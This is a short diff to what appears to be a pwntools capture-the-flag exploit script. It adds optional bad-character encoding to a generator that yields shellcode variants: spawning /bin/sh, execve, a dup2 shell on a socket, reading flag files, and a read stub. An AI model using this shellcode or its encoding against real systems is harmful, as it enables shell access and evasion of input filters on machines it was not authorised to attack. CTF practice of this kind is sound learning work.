@@ -33,19 +33,19 @@ def start():
 OFFSET = 40
 
 
-def shellcode_variants():
+def shellcode_variants(avoid=None):
     """Yield (name, shellcode_bytes) for common CTF objectives."""
     # classic /bin/sh
-    yield ("sh", asm(shellcraft.sh()))
+    yield ("sh", encode(asm(shellcraft.sh()), avoid) if avoid else asm(shellcraft.sh()))
     # cat flag
-    yield ("cat_flag", asm(shellcraft.cat("flag.txt")))
-    yield ("cat_flag_abs", asm(shellcraft.cat("/flag*")))
+    yield ("cat_flag", encode(asm(shellcraft.cat("flag.txt")), avoid) if avoid else asm(shellcraft.cat("flag.txt")))
+    yield ("cat_flag_abs", encode(asm(shellcraft.cat("/flag*")), avoid) if avoid else asm(shellcraft.cat("/flag*")))
     # execve /bin/sh
-    yield ("execve", asm(shellcraft.execve("/bin/sh", 0, 0)))
+    yield ("execve", encode(asm(shellcraft.execve("/bin/sh", 0, 0)), avoid) if avoid else asm(shellcraft.execve("/bin/sh", 0, 0)))
     # dup2 + shell for remote_fd cases
-    yield ("dup2_sh", asm(shellcraft.dupsh(4)))
+    yield ("dup2_sh", encode(asm(shellcraft.dupsh(4)), avoid) if avoid else asm(shellcraft.dupsh(4)))
     # small read stub for constrained buffers
-    yield ("read_stub", asm(shellcraft.read(0, "rsp", 0x100)))
+    yield ("read_stub", encode(asm(shellcraft.read(0, "rsp", 0x100)), avoid) if avoid else asm(shellcraft.read(0, "rsp", 0x100)))
 
 
 def orw_shellcode(path="/flag", fd=3):
